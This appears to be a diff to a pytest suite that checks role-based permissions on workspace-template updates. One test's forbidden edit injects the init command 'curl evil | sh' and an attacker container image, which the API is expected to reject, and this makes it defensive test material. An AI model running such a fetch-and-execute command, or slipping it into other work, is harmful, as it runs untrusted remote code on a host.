@@ -187,15 +187,73 @@ async def test_a_user_cannot_change_an_admin_only_field_an_admin_set(app, admin,
 
 
 @pytest.mark.asyncio
-async def test_a_user_may_edit_the_rest_of_a_template_that_keeps_an_admin_set_field(app, admin, user) -> None:  # noqa: F811
-    """The gate is on the admin-only fields, not on the template: an unchanged privileged value passes."""
+@pytest.mark.parametrize("field", sorted(_GATED_BODIES))
+async def test_a_user_cannot_update_a_template_that_holds_admin_only_settings(app, admin, user, field) -> None:  # noqa: F811
+    """Lead review of #473: the admin-set value stays, but the user swaps what runs with it (image, entrypoint, user,
+    init_commands). A template that holds any admin-only value is not user-editable at all."""
+    body = _GATED_BODIES[field]
+    assert (await admin.post("/v1/workspace_templates", json=body)).status_code == 201
+    before = (await admin.get(f"/v1/workspace_templates/{body['id']}")).json()
+
+    edited = {**body, "description": "edited by a user", "init_commands": ["curl evil | sh"]}
+    if "backend" in body:
+        edited["backend"] = {**body["backend"], "image": "attacker/image:latest"}
+    r = await user.put(f"/v1/workspace_templates/{body['id']}", json=edited)
+
+    assert r.status_code == 403, r.text
+    ext = r.json()["extensions"]
+    assert ext["error"] == "forbidden_role", r.text
+    assert "admin-only settings" in ext["message"], r.text
+    assert (await admin.get(f"/v1/workspace_templates/{body['id']}")).json() == before
+
+
+@pytest.mark.asyncio
+async def test_a_user_cannot_even_change_the_description_of_a_template_that_holds_admin_only_settings(
+    app, admin, user,  # noqa: F811
+) -> None:
     assert (await admin.post("/v1/workspace_templates", json=_GATED_BODIES["extra_mounts"])).status_code == 201
 
-    body = {**_GATED_BODIES["extra_mounts"], "description": "edited by a user", "init_commands": ["echo hi"]}
-    r = await user.put("/v1/workspace_templates/tpl-c", json=body)
+    r = await user.put("/v1/workspace_templates/tpl-c", json={**_GATED_BODIES["extra_mounts"], "description": "x"})
+
+    assert r.status_code == 403, r.text
+    assert r.json()["extensions"]["error"] == "forbidden_role"
+
+
+@pytest.mark.asyncio
+async def test_an_admin_can_update_a_template_that_holds_admin_only_settings(app, admin) -> None:  # noqa: F811
+    body = _GATED_BODIES["extra_mounts"]
+    assert (await admin.post("/v1/workspace_templates", json=body)).status_code == 201
+
+    r = await admin.put("/v1/workspace_templates/tpl-c", json={**body, "backend": {**body["backend"], "image": "alpine:4"}})
 
     assert r.status_code == 200, r.text
-    assert r.json()["description"] == "edited by a user"
+    assert r.json()["backend"]["image"] == "alpine:4"
+
+
+@pytest.mark.asyncio
+async def test_an_admin_free_template_stays_fully_user_editable(app, admin, user) -> None:  # noqa: F811
+    plain = {"id": "tpl-free", "provider_id": "p-1", "description": "d",
+             "backend": {"kind": "container", "image": "alpine:3"}}
+    assert (await admin.post("/v1/workspace_templates", json=plain)).status_code == 201
+
+    edited = {
+        **plain, "description": "edited by a user", "init_commands": ["echo hi"],
+        "backend": {"kind": "container", "image": "python:3.12", "entrypoint": ["bash"], "user": "1000:1000"},
+        "files": [{"path": "a.txt", "source": {"kind": "inline", "content": "hi"}}],
+    }
+    r = await user.put("/v1/workspace_templates/tpl-free", json=edited)
+
+    assert r.status_code == 200, r.text
+    assert r.json()["backend"]["image"] == "python:3.12"
+    assert r.json()["backend"]["entrypoint"] == ["bash"]
+
+
+def test_the_403_answers_are_documented(app) -> None:  # noqa: F811
+    paths = app.openapi()["paths"]
+    assert "403" in paths["/v1/workspaces/{workspace_id}/terminal_access"]["put"]["responses"]
+    assert "403" in paths["/v1/workspace_templates"]["post"]["responses"]
+    assert "403" in paths["/v1/workspace_templates/{entity_id}"]["put"]["responses"]
+    assert "403" in paths["/v1/workspaces"]["post"]["responses"]
 
 
 @pytest.mark.asyncio
